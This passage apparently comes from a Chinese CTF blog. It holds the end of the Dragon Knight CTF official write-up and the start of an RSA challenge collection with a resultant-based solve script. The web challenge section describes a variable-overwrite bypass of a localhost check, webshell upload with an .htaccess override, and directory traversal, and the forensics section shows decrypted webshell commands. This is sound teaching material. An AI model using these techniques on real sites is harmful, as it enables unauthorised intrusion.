<h3 id="Ezsignin"><a href="#Ezsignin" class="headerlink" title="Ezsignin"></a><strong>Ezsignin</strong></h3><p>瞎bb：超级简单的签到，看到 wp 人快碎了，一半非预期（<br>先扫目录或者试试敏感文件泄露，找到 index.php.bak，源码就不放这了<br>看到这里<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584032-e8cd63f6-9efa-4741-90b1-11f529b4bc07.png" alt="image.png"><br>需要本地，但是上面是存在一个变量覆盖函数的，所以可以直接覆盖这个变量<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584034-ad2e4134-3503-48e4-bfbc-a6fd9f889b5f.png" alt="image.png"><br>传入?_SERVER[REMOTE_ADDR]&#x3D;127.0.0.1即可进入文件上传的界面，这边因为我的 upload.php没有做相同的处理，导致可以直接利用表单给 upload.php上传文件，没办法，人太懒了（（（<br>后面就是上传一个 webshell，会发现不解析 php 文件，是因为我在 upload 下放了个.htaccess，我认为这很安全，这样你们上传的 php 就不会被解析了[doge]<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584066-afa3596c-fdf3-4f13-9be8-485c0849a56b.png" alt="image.png"><br>由于我没有对文件上传做任何限制，所以你可以上传一个.htaccess文件来打开 php 的解析引擎，这样你的 webshell 就可以正常解析了。<br>非预期做法：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585432-318cc460-962a-44fb-ad77-dd5e435e87f4.png" alt="image.png"><br>真是漏网之鱼啊，这里的 username可控，一点过滤没写，导致可以目录穿越写到 html 下面，就不受upload下的.htaccess的限制了，果然懒狗开发确实该死（bushi</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a><strong>签到</strong></h3><p>将浅色背景切换为深色二维码就显现了，扫码就行了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585633-4c3a0f1c-8ada-4c25-8e37-4737a6b81e63.png" alt="image.png"></p>
<h3 id="神秘的文字"><a href="#神秘的文字" class="headerlink" title="神秘的文字"></a><strong>神秘的文字</strong></h3><p>直接搜这段，是可以找到相关文章，但是复现发现是不行的<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585426-31f8ae0e-a970-4c81-a01e-10b77c9cb924.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585498-0ac4c61c-95fc-4261-9092-89318d3093ad.png" alt="image.png"><br>深入搜索可以找到Martin Kleppe项目，aem1k.com&#x2F;transliterate.js，发现其实就是jsfuck的变种，理解了原理，找到缺少内容alert(‘’);拼成完整的密文就可以弹窗得到密钥了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585432-f7e1fec7-43b4-469c-823c-ae03911f2eba.png" alt="image.png"></p>
<h3 id="DNA-5"><a href="#DNA-5" class="headerlink" title="DNA-5"></a><strong>DNA-5</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586832-e4e22c97-4cb5-4cc7-adb2-f979ffe76f30.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ata = </span><br><span class="line"><span class="string">&quot;ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACC</span></span><br><span class="line"><span class="string">CCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC&quot;</span> </span><br><span class="line">replacement_dict = &#123; </span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([replacement_dict.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> data]) </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586902-d01bf7ee-f47a-415e-aa3e-476a4556aff2.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586891-1694f1e6-4e5c-475d-ab0c-aae5c816d0e9.png" alt="image.png"></p>
<h3 id="AgedSLATE"><a href="#AgedSLATE" class="headerlink" title="AgedSLATE"></a><strong>AgedSLATE</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587343-a65ead61-ddec-4ad5-bd8a-f88fac053e90.png" alt="image.png"><br>相信那你在查看文档时也找到了名字好像很可疑，这就是第一段flag，对应的hint是：注意隐私保护，很多出题人出题时是没在意名字问题的等于自己把自己开了，本意是借此提醒<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586852-dcc25ba1-6f6b-4a4c-9f26-f1835ff19d11.png" alt="image.png"><br>接着分析doc会发现大量的01，很明显可以猜测为文档隐藏了内容全选后换个字体颜色就行了，，这段01猜测为01 to img，写个脚本就可以了（帮你们试过了大部分的工具出来的都是重叠，还是老老实实写脚本吧。如果你觉得文本量大不好处理，那为什么不试试word的替换功能呢）<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587761-dbcd0921-8994-404a-bc5c-155225fd8395.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588067-72974b46-45bf-4f14-973c-21960899ea55.png" alt="image.png"><br>转成的图片再识图，可以找到海嗣文字，需要反着读镜像后对照即可。“？”为“_“最开始图片上有明确展示<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587701-4fc5a648-0a08-4f66-9620-c8e834299670.png" alt="image.png"><br>拼接两段得到flag<br><strong>Steal_Data</strong><br>这个题其实就是一个自制的免杀马（但是其实什么也过不了）<br>然后回到题目本身<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587769-3b40a60b-5a32-44d6-b4a2-6a03d8f2939f.png" alt="image.png"><br>打开流量包，很多杂七杂八的包，看一下协议分级<br>可以看到有HTTP，那就看http<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587775-20abb7db-bc66-45fe-8caf-d29cc8abd5a6.png" alt="image.png"><br>已经看到shell了，那就直接追踪http流<br>参数有一个show_source，猜测返回的代码是shell的源码，复制出来去前端看<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588856-dfe92376-4810-43d0-8f6f-8d36d7b2d786.png" alt="image.png"><br>很简单的逻辑，然后再解开请求包</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="string">&#x27;q0c8bvkt+9/LeMRp7RaaDA==&#x27;</span> , <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="string">&#x27;d0c3a4017c22f6c3&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>再一个个地解开，看它的结果<br>执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">dir</span><br><span class="line">cd 51建模 &amp;&amp; type Route.py</span><br></pre></td></tr></table></figure>

<p>可以看到核心是后面的py<br>然后搜一下51建模B题<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588865-c5c7a735-aa2d-40b0-b0d9-db647e93a1c2.png" alt="image.png"><br>可以发现是一个求最短路径的题目，于是猜测给出的数组是路径图<br>用networkx库求最短路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line">lujin = [(<span class="number">102</span> ,<span class="number">22</span>) ,(<span class="number">22</span> ,<span class="number">33</span>) ,(<span class="number">33</span> ,<span class="number">108</span>) ,(<span class="number">108</span> ,<span class="number">102</span>) ,(<span class="number">108</span> ,<span class="number">12</span>) ,(<span class="number">12</span> ,<span class="number">13</span>) ,(<span class="number">13</span> ,<span class="number">97</span>) ,(<span class="number">108</span> ,<span class="number">97</span>) ,</span><br><span class="line">         (<span class="number">97</span> ,<span class="number">47</span>) ,(<span class="number">97</span> ,<span class="number">103</span>) ,(<span class="number">47</span> ,<span class="number">103</span>) ,(<span class="number">103</span> ,<span class="number">123</span>) ,(<span class="number">123</span> ,<span class="number">21</span>) ,(<span class="number">103</span> ,<span class="number">21</span>) ,(<span class="number">123</span> ,<span class="number">27</span>) ,(<span class="number">123</span> ,<span class="number">119</span>) ,</span><br><span class="line">         (<span class="number">119</span> ,<span class="number">27</span>) ,(<span class="number">119</span> ,<span class="number">58</span>) ,(<span class="number">119</span> ,<span class="number">105</span>) ,(<span class="number">58</span> ,<span class="number">105</span>) ,(<span class="number">105</span> ,<span class="number">115</span>) ,(<span class="number">105</span> ,<span class="number">44</span>) ,(<span class="number">115</span> ,<span class="number">44</span>) ,(<span class="number">115</span> ,<span class="number">104</span>) ,</span><br><span class="line">         (<span class="number">115</span> ,<span class="number">43</span>) ,(<span class="number">43</span> ,<span class="number">104</span>) ,(<span class="number">104</span> ,<span class="number">95</span>) ,(<span class="number">95</span> ,<span class="number">42</span>) ,(<span class="number">42</span> ,<span class="number">104</span>) ,(<span class="number">95</span> ,<span class="number">68</span>) ,(<span class="number">95</span> ,<span class="number">28</span>) ,(<span class="number">28</span> ,<span class="number">68</span>) ,(<span class="number">68</span> ,<span class="number">30</span>) ,</span><br><span class="line">         (<span class="number">30</span> ,<span class="number">114</span>) ,(<span class="number">68</span> ,<span class="number">114</span>) ,(<span class="number">114</span> ,<span class="number">65</span>) ,(<span class="number">114</span> ,<span class="number">62</span>) ,(<span class="number">62</span> ,<span class="number">65</span>) ,(<span class="number">65</span> ,<span class="number">71</span>) ,(<span class="number">65</span> ,<span class="number">60</span>) ,(<span class="number">71</span> ,<span class="number">60</span>) ,(<span class="number">71</span> ,<span class="number">61</span>) ,</span><br><span class="line">         (<span class="number">71</span> ,<span class="number">111</span>) ,(<span class="number">61</span> ,<span class="number">111</span>) ,(<span class="number">111</span> ,<span class="number">48</span>) ,(<span class="number">111</span> ,<span class="number">110</span>) ,(<span class="number">110</span> ,<span class="number">48</span>) ,(<span class="number">110</span> ,<span class="number">36</span>) ,(<span class="number">110</span> ,<span class="number">75</span>) ,(<span class="number">36</span> ,<span class="number">75</span>) ,(<span class="number">75</span> ,<span class="number">78</span>) ,</span><br><span class="line">         (<span class="number">75</span> ,<span class="number">38</span>) ,(<span class="number">38</span> ,<span class="number">78</span>) ,(<span class="number">78</span> ,<span class="number">39</span>) ,(<span class="number">78</span> ,<span class="number">73</span>) ,(<span class="number">73</span> ,<span class="number">39</span>) ,(<span class="number">73</span> ,<span class="number">46</span>) ,(<span class="number">73</span> ,<span class="number">57</span>) ,(<span class="number">46</span> ,<span class="number">57</span>) ,(<span class="number">57</span> ,<span class="number">9</span>) ,(<span class="number">57</span> ,<span class="number">72</span>) ,</span><br><span class="line">         (<span class="number">9</span> ,<span class="number">72</span>) ,(<span class="number">72</span> ,<span class="number">96</span>) ,(<span class="number">72</span> ,<span class="number">116</span>) ,(<span class="number">116</span> ,<span class="number">96</span>) ,(<span class="number">116</span> ,<span class="number">67</span>) ,(<span class="number">116</span> ,<span class="number">124</span>) ,(<span class="number">67</span> ,<span class="number">124</span>) ,(<span class="number">67</span> ,<span class="number">88</span>) ,(<span class="number">88</span> ,<span class="number">93</span>) ,(<span class="number">93</span> ,<span class="number">67</span>) ,</span><br><span class="line">         (<span class="number">88</span> ,<span class="number">70</span>) ,(<span class="number">70</span> ,<span class="number">94</span>) ,(<span class="number">88</span> ,<span class="number">94</span>) ,(<span class="number">70</span> ,<span class="number">45</span>) ,(<span class="number">70</span> ,<span class="number">63</span>) ,(<span class="number">63</span> ,<span class="number">45</span>) ,(<span class="number">45</span> ,<span class="number">66</span>) ,(<span class="number">66</span> ,<span class="number">31</span>) ,(<span class="number">45</span> ,<span class="number">31</span>) ,(<span class="number">66</span> ,<span class="number">69</span>) ,(<span class="number">66</span> ,<span class="number">59</span>) ,</span><br><span class="line">         (<span class="number">59</span> ,<span class="number">69</span>) ,(<span class="number">69</span> ,<span class="number">7</span>) ,(<span class="number">69</span> ,<span class="number">84</span>) ,(<span class="number">7</span> ,<span class="number">84</span>) ,(<span class="number">84</span> ,<span class="number">50</span>) ,(<span class="number">50</span> ,<span class="number">6</span>) ,(<span class="number">84</span> ,<span class="number">6</span>) ,(<span class="number">50</span> ,<span class="number">101</span>) ,(<span class="number">50</span> ,<span class="number">2</span>) ,(<span class="number">2</span> ,<span class="number">101</span>) ,(<span class="number">101</span> ,<span class="number">0</span>) ,</span><br><span class="line">         (<span class="number">101</span> ,<span class="number">82</span>) ,(<span class="number">0</span> ,<span class="number">82</span>) ,(<span class="number">82</span> ,<span class="number">125</span>)</span><br><span class="line">        ]</span><br><span class="line">G = nx.Graph()</span><br><span class="line">G.add_edges_from(lujin)</span><br><span class="line">lst = <span class="built_in">list</span>(nx.all_simple_paths(G ,source=<span class="number">102</span> ,target=<span class="number">125</span> ,cutoff=<span class="number">35</span>))</span><br><span class="line">min_len = <span class="built_in">min</span>([<span class="built_in">len</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> lst])</span><br><span class="line">[[<span class="built_in">print</span>(<span class="built_in">chr</span>(x) ,end=<span class="string">&quot;&quot;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> i] <span class="keyword">for</span> i <span class="keyword">in</span> lst <span class="keyword">if</span> <span class="built_in">len</span>(i) == min_len]</span><br></pre></td></tr></table></figure>

<p>flag{wish_DrAGonKNI9HtCXF-BET2eR}</p>
<p>func_Pixels<br>这个题目其实有一点点脑洞，给各位师傅道个歉，<br>描述中的（0,0）提出来转为ascii就是DRK，<br>但是后面那个hint给的其实很明显，应该都能想到就是green通道的位置是计数器的二次方，那么blue通道就是计数器的三次方，red通道就是计数器的一次方，看一下加密代码更清楚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_encode</span>(<span class="params">img ,flag</span>):</span><br><span class="line">    width, height = img.size</span><br><span class="line">    pixels = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            pixels[(x ,y)] = img.getpixel((x ,y))</span><br><span class="line">    <span class="built_in">print</span>(pixels[(<span class="number">0</span>,<span class="number">0</span>)])</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> ,<span class="built_in">int</span>(<span class="built_in">len</span>(flag)/<span class="number">3</span>)):</span><br><span class="line">        r_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">1</span>))</span><br><span class="line">        g_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">2</span>))</span><br><span class="line">        b_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        pixels[(pos ,r_pos)] = (<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>]) ,pixels[(pos ,r_pos)][<span class="number">1</span>] ,pixels[(pos ,r_pos)][<span class="number">2</span>])</span><br><span class="line">        pixels[(pos ,g_pos)] = (pixels[(pos ,r_pos)][<span class="number">0</span>] ,<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>+<span class="number">1</span>]) ,pixels[(pos ,r_pos)][<span class="number">2</span>])</span><br><span class="line">        pixels[(pos ,b_pos)] = (pixels[(pos ,r_pos)][<span class="number">0</span>] ,pixels[(pos ,r_pos)][<span class="number">1</span>] ,<span class="built_in">ord</span>(flag[pos*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key ,value <span class="keyword">in</span> pixels.items():</span><br><span class="line">        img.putpixel(key ,value)</span><br><span class="line">    img.save(<span class="string">&quot;./LEIMU_encoded.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>根据加密函数写一下就完事</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_decode</span>(<span class="params">img</span>):</span><br><span class="line">    width ,height = img.size</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span> ,<span class="number">10</span>):</span><br><span class="line">        r_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">1</span>))</span><br><span class="line">        g_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">2</span>))</span><br><span class="line">        b_pos = <span class="built_in">int</span>(math.<span class="built_in">pow</span>(pos ,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">        r = img.getpixel((pos ,r_pos))[<span class="number">0</span>]</span><br><span class="line">        g = img.getpixel((pos ,g_pos))[<span class="number">1</span>]</span><br><span class="line">        b = img.getpixel((pos ,b_pos))[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">chr</span>(r)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(g)&#125;</span><span class="subst">&#123;<span class="built_in">chr</span>(b)&#125;</span>&quot;</span> ,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>有一点脑洞，给各位👴跪了</p>
<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a><strong>Osint</strong></h2><p>给大家道个歉吧，这题本来是不好做的，某些原因导致可以直接识图找到了<br>Ai 识别发现并不在国内，在美国<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588795-61b58113-b4ce-43c2-a591-7083933985fe.png" alt="image.png"><br>搜索美国标志性摩天轮一个个排查就可以找到了，因为角度比较刁钻看不到海岸线的特征会 有很多的误导项，找到最著名的几个可以佛罗里达州，直接搜佛罗里达州摩天轮就行了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588797-653cb50b-5944-4200-bc12-106667b15486.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733589123-26e938e8-844c-4a97-b678-79072e2ffd0b.png" alt="image.png"><br>朋友卡的非常好，但凡漏出红色缆车都会被秒<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733591050-fbd33c86-b2f2-430f-89fe-5707add8aeca.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA题型收集</title>
    <url>/2024/10/25/RSA%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>持续更新ing……</p>
<span id="more"></span>

<h1 id="一，结式的使用"><a href="#一，结式的使用" class="headerlink" title="一，结式的使用"></a>一，结式的使用</h1><h2 id="1，NewStar-CTF-2024-学以致用"><a href="#1，NewStar-CTF-2024-学以致用" class="headerlink" title="1，NewStar CTF 2024-学以致用"></a>1，NewStar CTF 2024-学以致用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg, nbits</span>):</span><br><span class="line">    <span class="comment"># pad了一下，仔细看看，别好不容易解出来了却没看到flag👼</span></span><br><span class="line">    pad_length = nbits - <span class="built_in">len</span>(msg) * <span class="number">8</span> - <span class="number">16</span></span><br><span class="line">    <span class="keyword">assert</span> pad_length &gt;= <span class="number">0</span></span><br><span class="line">    pad = random.getrandbits(pad_length).to_bytes((pad_length + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pad[:<span class="built_in">len</span>(pad)//<span class="number">2</span>] + <span class="string">b&quot;*&quot;</span> + msg + <span class="string">b&quot;*&quot;</span> + pad[<span class="built_in">len</span>(pad)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    Nbits = <span class="number">2048</span></span><br><span class="line">    flag = <span class="string">b&#x27;flag&#123;?????&#125;&#x27;</span></span><br><span class="line">    gift = <span class="string">b&#x27;GoOd_byE_nEw_5t@r&#x27;</span></span><br><span class="line">    </span><br><span class="line">    flag1 = bytes_to_long(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>], Nbits-<span class="number">1</span>))</span><br><span class="line">    flag2 = bytes_to_long(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:], Nbits-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, <span class="built_in">pow</span>(flag1, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, <span class="built_in">pow</span>(flag2, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c3 =&#x27;</span>, <span class="built_in">pow</span>(flag1 + flag2 + bytes_to_long(gift), e, n))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 17072342544150714171879132077494975311237876365187751353863158074020024719122755004761547735987417065592254800869192615807192722193500063611855839293567948232939959753821265552288663615847715716482887552271575844394350597695771100384136647573934496089812758071894172682439278191678102960768874456521879228612030147515967603129172838399997929502420254427798644285909855414606857035622716853274887875327854429218889083561315575947852542496274004905526475639809955792541187225767181054156589100604740904889686749740630242668885218256352895323426975708439512538106136364251265896292820030381364013059573189847777297569447</span></span><br><span class="line"><span class="string">c1 = 8101607280875746172766350224846108949565038929638360896232937975003150339090901182469578468557951846695946788093600030667125114278821199071782965501023811374181199570231982146140558093531414276709503788909827053368206185816004954186722115752214445121933300663507795347827581212475501366473409732970429363451582182754416452300394502623461416323078625518733218381660019606631159370121924340238446442870526675388637840247597153414432589505667533462640554984002009801576552636432097311654946821118444391557368410974979376926427631136361612166670672126393485023374083079458502529640435635667010258110833498681992307452573</span></span><br><span class="line"><span class="string">c2 = 14065316670254822235992102489645154264346717769174145550276846121970418622727279704820311564029018067692096462028836081822787148419633716320984336571241963063899868344606864544582504200779938815500203097282542495029462627888080005688408399148971228321637101593575245562307799087481654331283466914448740771421597528473762480363235531826325289856465115044393153437766069365345615753845871983173987642746989559569021189014927911398163825342784515926151087560415374622389991673648463353143338452444851518310480115818005343166067775633021475978188567581820594153290828348099804042221601767330439504722881619147742710013878</span></span><br><span class="line"><span class="string">c3 = 8094336015065392504689373372598739049074197380146388624166244791783464194652108498071001125262374720857829973449322589841225625661419126346483855290185428811872962549590383450801103516360026351074061702370835578483728260907424050069246549733800397741622131857548326468990903316013060783020272342924805005685309618377803255796096301560780471163963183261626005358125719453918037250566140850975432188309997670739064455030447411193814358481031511873409200036846039285091561677264719855466015739963580639810265153141785946270781617266125399412714450669028767459800001425248072586059267446605354915948603996477113109045600</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = bytes_to_long(<span class="string">b&#x27;GoOd_byE_nEw_5t@r&#x27;</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">17072342544150714171879132077494975311237876365187751353863158074020024719122755004761547735987417065592254800869192615807192722193500063611855839293567948232939959753821265552288663615847715716482887552271575844394350597695771100384136647573934496089812758071894172682439278191678102960768874456521879228612030147515967603129172838399997929502420254427798644285909855414606857035622716853274887875327854429218889083561315575947852542496274004905526475639809955792541187225767181054156589100604740904889686749740630242668885218256352895323426975708439512538106136364251265896292820030381364013059573189847777297569447</span></span><br><span class="line">c1 = <span class="number">8101607280875746172766350224846108949565038929638360896232937975003150339090901182469578468557951846695946788093600030667125114278821199071782965501023811374181199570231982146140558093531414276709503788909827053368206185816004954186722115752214445121933300663507795347827581212475501366473409732970429363451582182754416452300394502623461416323078625518733218381660019606631159370121924340238446442870526675388637840247597153414432589505667533462640554984002009801576552636432097311654946821118444391557368410974979376926427631136361612166670672126393485023374083079458502529640435635667010258110833498681992307452573</span></span><br><span class="line">c2 = <span class="number">14065316670254822235992102489645154264346717769174145550276846121970418622727279704820311564029018067692096462028836081822787148419633716320984336571241963063899868344606864544582504200779938815500203097282542495029462627888080005688408399148971228321637101593575245562307799087481654331283466914448740771421597528473762480363235531826325289856465115044393153437766069365345615753845871983173987642746989559569021189014927911398163825342784515926151087560415374622389991673648463353143338452444851518310480115818005343166067775633021475978188567581820594153290828348099804042221601767330439504722881619147742710013878</span></span><br><span class="line">c3 = <span class="number">8094336015065392504689373372598739049074197380146388624166244791783464194652108498071001125262374720857829973449322589841225625661419126346483855290185428811872962549590383450801103516360026351074061702370835578483728260907424050069246549733800397741622131857548326468990903316013060783020272342924805005685309618377803255796096301560780471163963183261626005358125719453918037250566140850975432188309997670739064455030447411193814358481031511873409200036846039285091561677264719855466015739963580639810265153141785946270781617266125399412714450669028767459800001425248072586059267446605354915948603996477113109045600</span></span><br><span class="line"><span class="comment"># get resultant</span></span><br><span class="line">P.&lt;m1, m2&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = m1**e - c1</span><br><span class="line">f2 = m2**e - c2</span><br><span class="line">f3 = (m1+m2+gift)**e - c3</span><br><span class="line">res1 = f1.sylvester_matrix(f3,m1).det()</span><br><span class="line">res2 = f2.sylvester_matrix(f3,m2).det()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get m2</span></span><br><span class="line">rres = <span class="number">0</span></span><br><span class="line">P.&lt;m2&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res1.coefficients())):</span><br><span class="line">    rres += res1.coefficients()[i]*(m2^(res1.exponents()[i][<span class="number">1</span>]))</span><br><span class="line">f2 = m2**e - c2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="comment"># print(g1)</span></span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line">m2 = <span class="built_in">int</span>(-gcd(rres, f2)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># get m1 (Method 1)</span></span><br><span class="line"><span class="string">rres = 0</span></span><br><span class="line"><span class="string">P.&lt;m1&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">for i in range(len(res2.coefficients())):</span></span><br><span class="line"><span class="string">    # print(res1.coefficients()[i]*(m1^(res1.exponents()[i][1]))</span></span><br><span class="line"><span class="string">    rres += res2.coefficients()[i]*(m1^(res2.exponents()[i][0]))</span></span><br><span class="line"><span class="string">f1 = m1**e - c1</span></span><br><span class="line"><span class="string"># print(rres)</span></span><br><span class="line"><span class="string">def gcd(g1, g2):</span></span><br><span class="line"><span class="string">    while g2:</span></span><br><span class="line"><span class="string">        g1, g2 = g2, g1 % g2</span></span><br><span class="line"><span class="string">    # print(g1)</span></span><br><span class="line"><span class="string">    return g1.monic()</span></span><br><span class="line"><span class="string">m1 = int(-gcd(rres, f1)[0])</span></span><br><span class="line"><span class="string"># print(long_to_bytes(m1))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get m1 (Method 2)</span></span><br><span class="line">P.&lt;m1&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = m1**e - c1</span><br><span class="line">f3 = (m1+m2+gift)**e - c3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="comment"># print(g1)</span></span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(-gcd(f3, f1)[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;W1Sh_you_Bec0me_an_excelL3nt_crypt0G2@pher&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先对f1和f3打结式，和f2作gcd得到m2。</p>
